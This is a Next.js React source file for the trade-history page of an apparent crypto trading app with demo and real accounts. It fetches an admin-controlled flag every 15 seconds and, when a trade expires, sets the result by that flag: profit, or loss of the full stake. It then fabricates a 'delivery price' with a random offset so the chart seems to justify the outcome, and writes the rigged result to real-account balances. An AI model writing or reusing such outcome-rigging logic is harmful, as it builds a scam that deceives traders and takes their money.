"use client";

import Link from "next/link";
import { useState, useEffect } from "react";
import { useTradeStore } from "@/lib/tradeStore";
import { useAccount } from "wagmi";
import { useParams } from "next/navigation";
import { getCoin } from "@/lib/data";

const COLORS = {
  purple: "#4b0082", // Dark purple
  white: "#ffffff",
  background: "#0a1026",
  navy: "#172042", // Slightly lighter navy blue
  textWhite: "#ffffff",
  textGray: "#b0b8c1",
  lightGray: "#d1d5db",
  darkGray: "#374151",
};

export default function HistoryPage() {
  const [tab, setTab] = useState<"wait" | "finished">("finished");
  const [accountFilter, setAccountFilter] = useState<"demo" | "real">("demo");
  // Admin-controlled flag fetched from /api/flags/trade-profit
  const [forceProfit, setForceProfit] = useState<boolean>(false);
  const { coinData } = useParams<{ coinData: string }>();
  const coin = getCoin(coinData);
  const { address } = useAccount();
  const trades = useTradeStore((state) => state.trades);
  const updateTrade = useTradeStore((state) => state.updateTrade);
  const addBalance = async (addBalance: number, network: string, tradeBalance: number) => {
    try {
      // const address = window.ethereum?.selectedAddress;
      await fetch(`/api/updateBalance`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address,
          addBalance,
          network,
          tradeBalance
        }),
      });
    } catch (error) {
      console.error("Error fetching wallets:", error);
    }
  };

  // Fetch the admin-controlled profitability flag regularly
  const fetchFlag = async (cancelled: boolean) => {
    try {
      const res = await fetch('/api/flags/trade-profit', { cache: 'no-store' });
      const txt = (await res.text()).trim().toLowerCase();
      if (!cancelled) setForceProfit(txt === 'true');
    } catch {
      if (!cancelled) setForceProfit(false);
    }
  };
  useEffect(() => {
    let cancelled = false;
    fetchFlag(cancelled);
    const interval = setInterval(() => fetchFlag(cancelled), 15000); // refresh every 15s
    return () => { cancelled = true; clearInterval(interval); };
  }, []);

  // Auto-update trade statuses when deliverTime expires
  useEffect(() => {
    const interval = setInterval(() => {
      trades.forEach((trade) => {
        if (trade.status === "wait") {
          fetchFlag(false); // Ensure we have the latest flag
          const start = new Date(trade.id).getTime();
          const now = Date.now();
          const deliverMs = trade.deliveryTime * 1000;
          if (now >= start + deliverMs) {
            // Apply admin flag: force profitable or non-profitable
            const adjustedProfit = (forceProfit ? 1 : -1) * Math.abs(Number(forceProfit ? trade.profit : trade.purchaseAmount));
            const randomFactor = Number((Math.random() * 4.9 + 0.1).toFixed(2));
            const purchaseAmount = Number(trade.purchasePrice) || 0;
            const normalizedDirection = trade.direction?.toLowerCase();
            const isBuyShort = normalizedDirection === "buy short";
            const isBuyLong = normalizedDirection === "buy long";
            const addRandomFactor = forceProfit
              ? isBuyLong || (!isBuyShort && !isBuyLong)
              : isBuyShort || (!isBuyShort && !isBuyLong);
            const deliveryPrice = Number(
              (purchaseAmount + (addRandomFactor ? randomFactor : -randomFactor)).toFixed(2)
            );
            updateTrade(trade.id, { status: "finished", profit: adjustedProfit, deliveryPrice });
            if(trade.accountType === "Demo Account") return;
            addBalance(adjustedProfit, trade.pair, trade.purchaseAmount);
          }
        }
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [trades, updateTrade, forceProfit]);

  const filtered = trades
    .filter((t) => {
      const isReal = t.accountType === "Real Account";
      return accountFilter === "real" ? isReal : !isReal;
    })
    .filter((t) => t.status === tab);

  return (
    <div
      className="min-h-screen"
      style={{ background: COLORS.background, color: COLORS.textWhite }}
    >
      {/* Header */}
      <div
        className="p-4 flex items-center justify-between flex-wrap gap-4"
        style={{
          background: COLORS.navy,
          color: COLORS.textWhite,
          borderBottom: `1px solid ${COLORS.purple}`,
        }}
      >
        <div className="flex items-center">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="mr-2">
            <path d="M9 12H15M9 16H15M9 8H15M5 21H19C20.1046 21 21 20.1046 21 19V5C21 3.89543 20.1046 3 19 3H5C3.89543 3 3 3.89543 3 5V19C3 20.1046 3.89543 21 5 21Z" 
                  stroke={COLORS.textWhite} strokeWidth="2" strokeLinecap="round"/>
          </svg>
          <h1 className="text-lg font-semibold">Trade History</h1>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex rounded-lg overflow-hidden border" style={{ borderColor: COLORS.purple }}>
            <button
              onClick={() => setAccountFilter("demo")}
              className="px-3 py-1 text-xs font-medium transition-colors"
              style={{
                background: accountFilter === "demo" ? COLORS.purple : "transparent",
                color: accountFilter === "demo" ? COLORS.textWhite : COLORS.textGray
              }}
            >
              Demo
            </button>
            <button
              onClick={() => setAccountFilter("real")}
              className="px-3 py-1 text-xs font-medium transition-colors"
              style={{
                background: accountFilter === "real" ? COLORS.purple : "transparent",
                color: accountFilter === "real" ? COLORS.textWhite : COLORS.textGray
              }}
            >
              Real
            </button>
          </div>
          <span className="text-sm px-3 py-1 rounded-full"
            style={{ background: COLORS.purple, color: COLORS.textWhite }}>
            {accountFilter === "demo" ? "Demo Account" : "Real Account"}
          </span>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex p-4 items-center justify-between">
        <div className="flex gap-2 rounded-lg p-1" style={{ background: COLORS.navy }}>
          <button
            onClick={() => setTab("wait")}
            className="px-4 py-2 rounded-md transition-all"
            style={{
              background: tab === "wait" ? COLORS.purple : "transparent",
              color: tab === "wait" ? COLORS.textWhite : COLORS.textGray,
              fontWeight: tab === "wait" ? 600 : 400,
            }}
          >
            Pending
          </button>
          <button
            onClick={() => setTab("finished")}
            className="px-4 py-2 rounded-md transition-all"
            style={{
              background: tab === "finished" ? COLORS.purple : "transparent",
              color: tab === "finished" ? COLORS.textWhite : COLORS.textGray,
              fontWeight: tab === "finished" ? 600 : 400,
            }}
          >
            Completed
          </button>
        </div>
      </div>

      {/* Trade list */}
      <div className="p-4 space-y-3">
        {filtered.length === 0 && (
          <div className="text-center py-8" style={{ color: COLORS.textGray }}>
            <svg className="mx-auto mb-4 w-12 h-12" fill="none" stroke={COLORS.textGray} viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
            </svg>
            <p>No trades found</p>
          </div>
        )}
        {filtered.map((trade) => {
          const start = new Date(trade.id).getTime();
          const now = Date.now();
          const deliverMs = trade.deliveryTime * 1000;
          const remaining = Math.max(0, Math.floor((start + deliverMs - now) / 1000));

          return (
            <Link
              key={trade.id}
              href={`tradeHistory/${trade.id}`}
              className="flex justify-between p-4 rounded-xl shadow hover:shadow-lg transition-all duration-200"
              style={{
                background: COLORS.navy,
                color: COLORS.textWhite,
                border: `1px solid ${COLORS.purple}`,
              }}
            >
              <div className="flex items-center gap-3">
                <div className="p-2 rounded-lg" style={{ background: COLORS.background }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                    <path d="M9 12H15M9 16H15M9 8H15M5 21H19C20.1046 21 21 20.1046 21 19V5C21 3.89543 20.1046 3 19 3H5C3.89543 3 3 3.89543 3 5V19C3 20.1046 3.89543 21 5 21Z" 
                          stroke={COLORS.textWhite} strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <span className="font-semibold">{trade.pair}</span>
                    <span className="text-xs px-2 py-1 rounded-full" 
                          style={{ 
                            background: trade.direction === "Buy long" ? "#10B981" : "#EF4444",
                            color: COLORS.textWhite
                          }}>
                      {trade.direction}
                    </span>
                  </div>
                  <p className="text-xs" style={{ color: COLORS.textGray }}>
                    {trade.date} {trade.status === "wait" && `• ${remaining}s remaining`}
                  </p>
                </div>
              </div>
              <div className="text-right">
                <p className="font-semibold text-lg">
                  {trade.profit >= 0 ? "+" : ""}{trade.profit.toFixed(2)}
                </p>
                <p className="text-xs" style={{ 
                  color: trade.profit >= 0 ? COLORS.textWhite : "#EF4444",
                  opacity: 0.8 
                }}>
                  USDT
                </p>
              </div>
            </Link>
          );
        })}
      </div>
    </div>
  );
}